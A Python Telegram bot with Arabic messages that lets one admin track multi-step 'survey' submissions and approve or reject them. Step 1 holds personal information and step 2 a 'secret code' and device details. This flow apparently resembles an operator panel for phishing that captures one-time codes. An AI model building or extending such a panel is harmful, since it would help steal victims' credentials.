import telebot
import json
import os
import re
from datetime import datetime

# إعداد البوت
TOKEN = "ضع_توكن_بوتك_هنا"
ADMIN_CHAT_ID = "ضع_شات_آيدي_هنا"
bot = telebot.TeleBot(TOKEN)

# ملفات البيانات
SURVEYS_FILE = "surveys.json"

# تحميل البيانات
def load_surveys():
    try:
        if os.path.exists(SURVEYS_FILE):
            with open(SURVEYS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        print(f"❌ خطأ في تحميل البيانات: {e}")
    return []

def save_surveys(surveys):
    try:
        with open(SURVEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(surveys, f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print(f"❌ خطأ في حفظ البيانات: {e}")
        return False

# معالجة أوامر البدء
@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        bot.send_message(message.chat.id, "⛔ هذا البوت للمدير فقط")
        return
    
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.row("📋 الاستبيانات المعلقة", "✅ المقبولة")
    keyboard.row("📊 الإحصائيات", "🔄 تحديث")
    
    welcome = """
🛠️ *لوحة تحكم نظام الاستبيانات*

📌 *معلومات النظام:*
• نظام استبيانات مكون من خطوتين
• الخطوة 1: المعلومات الشخصية
• الخطوة 2: الرمز ومعلومات الجهاز
• بعد اكتمال الخطوتين، تظهر أزرار القبول/الرفض

📋 *الأوامر المتاحة:*
/pending - عرض الاستبيانات المعلقة
/approved - عرض المقبولة
/stats - الإحصائيات
/help - عرض هذه الرسالة

⚡ *كيف يعمل:*
1. المستخدم يرسل الخطوة 1
2. المستخدم يرسل الخطوة 2  
3. تصل لك رسالة مكتملة مع أزرار التحكم
4. تضغط قبول أو رفض
"""
    
    bot.send_message(message.chat.id, welcome, 
                     parse_mode='Markdown', reply_markup=keyboard)

# معالجة الخطوة 1
@bot.message_handler(regexp=r'📋 \*استبيان جديد - الخطوة 1')
def handle_step1_message(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    # استخراج رقم الاستبيان
    survey_id_match = re.search(r'رقم الاستبيان.*`([^`]+)`', message.text)
    
    if survey_id_match:
        survey_id = survey_id_match.group(1)
        
        # حفظ كخطوة 1
        surveys = load_surveys()
        
        # البحث إن كان موجوداً
        existing = next((s for s in surveys if s.get('surveyId') == survey_id), None)
        
        if not existing:
            new_survey = {
                'surveyId': survey_id,
                'step1_message_id': message.message_id,
                'step1_received': True,
                'step2_received': False,
                'status': 'step1_only',
                'received_at': datetime.now().isoformat(),
                'step1_time': datetime.now().strftime('%Y-%m-%d %H:%M')
            }
            
            surveys.append(new_survey)
            save_surveys(surveys)
        
        # إرسال تأكيد
        bot.reply_to(message, f"""
✅ *تم استلام المعلومات الشخصية*
🆔 `{survey_id}`
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M')}

📝 *ملاحظة:* بانتظار إكمال الرمز السري (الخطوة 2)
        """, parse_mode='Markdown')

# معالجة الخطوة 2
@bot.message_handler(regexp=r'🔐 \*اكتمال الاستبيان - الخطوة 2')
def handle_step2_message(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    # استخراج رقم الاستبيان
    survey_id_match = re.search(r'رقم الاستبيان.*`([^`]+)`', message.text)
    
    if survey_id_match:
        survey_id = survey_id_match.group(1)
        
        # تحديث البيانات
        surveys = load_surveys()
        
        for survey in surveys:
            if survey.get('surveyId') == survey_id:
                survey['step2_received'] = True
                survey['step2_message_id'] = message.message_id
                survey['step2_time'] = datetime.now().strftime('%Y-%m-%d %H:%M')
                survey['status'] = 'step2_received'
                break
        
        save_surveys(surveys)
        
        bot.reply_to(message, f"""
🔐 *تم استلام الرمز السري*
🆔 `{survey_id}`
✅ الخطوة الثانية مكتملة

⏳ *جاري انتظار اكتمال الاستبيان...*
        """, parse_mode='Markdown')

# معالجة الاستبيان المكتمل
@bot.message_handler(regexp=r'🎉 \*استبيان مكتمل')
def handle_complete_survey(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    # استخراج رقم الاستبيان
    survey_id_match = re.search(r'رقم الاستبيان.*`([^`]+)`', message.text)
    
    if survey_id_match:
        survey_id = survey_id_match.group(1)
        
        # تحديث البيانات
        surveys = load_surveys()
        
        for survey in surveys:
            if survey.get('surveyId') == survey_id:
                survey['final_message_id'] = message.message_id
                survey['status'] = 'pending'
                survey['completed_at'] = datetime.now().isoformat()
                survey['final_time'] = datetime.now().strftime('%Y-%m-%d %H:%M')
                break
        else:
            # إذا لم يكن موجوداً، نضيفه جديداً
            new_survey = {
                'surveyId': survey_id,
                'final_message_id': message.message_id,
                'status': 'pending',
                'completed_at': datetime.now().isoformat(),
                'final_time': datetime.now().strftime('%Y-%m-%d %H:%M')
            }
            surveys.append(new_survey)
        
        save_surveys(surveys)
        
        # إرسال إشعار للمدير
        bot.send_message(
            message.chat.id,
            f"📬 *استبيان جديد مكتمل*\n"
            f"🆔 `{survey_id}`\n"
            f"✅ الخطوتان مكتملتان\n"
            f"👆 يمكنك الموافقة أو الرفض من الرسالة أعلاه",
            parse_mode='Markdown'
        )

# معالجة أزرار الموافقة/الرفض
@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'reject_', 'details_')))
def handle_callbacks(call):
    if str(call.message.chat.id) != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "⛔ غير مصرح لك")
        return
    
    if call.data.startswith('approve_'):
        survey_id = call.data.replace('approve_', '')
        update_survey_status(survey_id, 'approved', call)
        
    elif call.data.startswith('reject_'):
        survey_id = call.data.replace('reject_', '')
        update_survey_status(survey_id, 'rejected', call)
        
    elif call.data.startswith('details_'):
        survey_id = call.data.replace('details_', '')
        show_survey_details(survey_id, call)

# تحديث حالة الاستبيان
def update_survey_status(survey_id, status, call):
    surveys = load_surveys()
    
    for survey in surveys:
        if survey.get('surveyId') == survey_id:
            survey['status'] = status
            survey['reviewed_by'] = call.from_user.username or "مدير"
            survey['reviewed_at'] = datetime.now().isoformat()
            break
    
    if save_surveys(surveys):
        status_text = "مقبول ✅" if status == 'approved' else "مرفوض ❌"
        
        # تحديث رسالة البوت
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=call.message.text + f"\n\n📌 *الحالة:* {status_text}\n"
                                      f"👮 *المراجع:* {call.from_user.username or 'مدير'}\n"
                                      f"⏰ *وقت المراجعة:* {datetime.now().strftime('%Y-%m-%d %H:%M')}",
                parse_mode='Markdown',
                reply_markup=call.message.reply_markup  # نحافظ على الأزرار
            )
        except Exception as e:
            print(f"❌ خطأ في تحديث الرسالة: {e}")
        
        bot.answer_callback_query(call.id, f"✅ تم {status_text} الاستبيان")
    else:
        bot.answer_callback_query(call.id, "❌ فشل في تحديث الحالة")

# عرض تفاصيل الاستبيان
def show_survey_details(survey_id, call):
    surveys = load_surveys()
    survey = next((s for s in surveys if s.get('surveyId') == survey_id), None)
    
    if survey:
        details = f"""
📄 *تفاصيل الاستبيان*
┌─────────────────
│ 🆔 الرقم: `{survey_id}`
│ 📊 الحالة: {survey.get('status', 'غير معروف')}
│ ⏰ وقت الاستلام: {survey.get('final_time', 'غير معروف')}
│ 
│ 📋 الخطوات المستلمة:
│ • الخطوة 1: {'✅' if survey.get('step1_received') else '❌'}
│ • الخطوة 2: {'✅' if survey.get('step2_received') else '❌'}
└─────────────────
        """
        
        bot.send_message(call.message.chat.id, details, parse_mode='Markdown')
        bot.answer_callback_query(call.id, "📄 عرض التفاصيل")
    else:
        bot.answer_callback_query(call.id, "❌ لم يتم العثور على الاستبيان")

# عرض الاستبيانات المعلقة
@bot.message_handler(commands=['pending'])
def show_pending(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    surveys = load_surveys()
    pending = [s for s in surveys if s.get('status') == 'pending']
    
    if not pending:
        bot.send_message(message.chat.id, "✅ *لا توجد استبيانات معلقة حالياً*", parse_mode='Markdown')
        return
    
    for survey in pending[:10]:
        survey_text = f"""
📋 *استبيان معلق*
🆔 `{survey.get('surveyId', 'غير معروف')}`
⏰ وقت الاستلام: {survey.get('final_time', 'غير معروف')}
📊 الحالة: بانتظار المراجعة
"""
        
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.row(
            telebot.types.InlineKeyboardButton("✅ قبول", callback_data=f"approve_{survey['surveyId']}"),
            telebot.types.InlineKeyboardButton("❌ رفض", callback_data=f"reject_{survey['surveyId']}")
        )
        keyboard.row(
            telebot.types.InlineKeyboardButton("👁️ تفاصيل", callback_data=f"details_{survey['surveyId']}")
        )
        
        bot.send_message(message.chat.id, survey_text, 
                         parse_mode='Markdown', reply_markup=keyboard)

# عرض الإحصائيات
@bot.message_handler(commands=['stats'])
def show_stats(message):
    if str(message.chat.id) != ADMIN_CHAT_ID:
        return
    
    surveys = load_surveys()
    
    total = len(surveys)
    pending = len([s for s in surveys if s.get('status') == 'pending'])
    approved = len([s for s in surveys if s.get('status') == 'approved'])
    rejected = len([s for s in surveys if s.get('status') == 'rejected'])
    step1_only = len([s for s in surveys if s.get('status') == 'step1_only'])
    step2_received = len([s for s in surveys if s.get('status') == 'step2_received'])
    
    stats_text = f"""
📈 *إحصائيات النظام*

📊 *الأرقام:*
• إجمالي الاستبيانات: {total}
• بانتظار المراجعة: {pending}
• المقبولة: {approved}
• المرفوضة: {rejected}

🔄 *مراحل الاستلام:*
• الخطوة 1 فقط: {step1_only}
• الخطوة 2 مستلمة: {step2_received}

⏰ *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M')}
"""
    
    bot.send_message(message.chat.id, stats_text, parse_mode='Markdown')

# معالجة الأزرار النصية
@bot.message_handler(func=lambda m: m.text in ["📋 الاستبيانات المعلقة", "✅ المقبولة", "📊 الإحصائيات", "🔄 تحديث"])
def handle_text_buttons(message):
    if message.text == "📋 الاستبيانات المعلقة":
        show_pending(message)
    elif message.text == "✅ المقبولة":
        show_approved(message)
    elif message.text == "📊 الإحصائيات":
        show_stats(message)
    elif message.text == "🔄 تحديث":
        bot.send_message(message.chat.id, "🔄 *تم تحديث البيانات*", parse_mode='Markdown')
        show_stats(message)

# عرض الاستبيانات المقبولة
def show_approved(message):
    surveys = load_surveys()
    approved = [s for s in surveys if s.get('status') == 'approved']
    
    if not approved:
        bot.send_message(message.chat.id, "📭 *لا توجد استبيانات مقبولة*", parse_mode='Markdown')
        return
    
    count = len(approved)
    approved_text = f"✅ *الاستبيانات المقبولة ({count}):*\n\n"
    
    for i, survey in enumerate(approved[:10], 1):
        approved_text += f"{i}. `{survey.get('surveyId', 'N/A')}` - "
        approved_text += f"{survey.get('reviewed_by', 'غير معروف')}\n"
    
    bot.send_message(message.chat.id, approved_text, parse_mode='Markdown')

# بدء البوت
if __name__ == "__main__":
    print("🤖 بوت نظام الاستبيانات (الخطوتين) يعمل...")
    print(f"👤 المدير: {ADMIN_CHAT_ID}")
    print("⏳ في انتظار الاستبيانات...")
    print("📨 سيتلقى المدير 3 رسائل لكل استبيان:")
    print("   1. 📋 الخطوة 1 - المعلومات الشخصية")
    print("   2. 🔐 الخطوة 2 - الرمز ومعلومات الجهاز")
    print("   3. 🎉 الاستبيان المكتمل (مع أزرار التحكم)")
    
    try:
        bot.polling(none_stop=True, interval=1)
    except Exception as e:
        print(f"❌ خطأ في تشغيل البوت: {e}")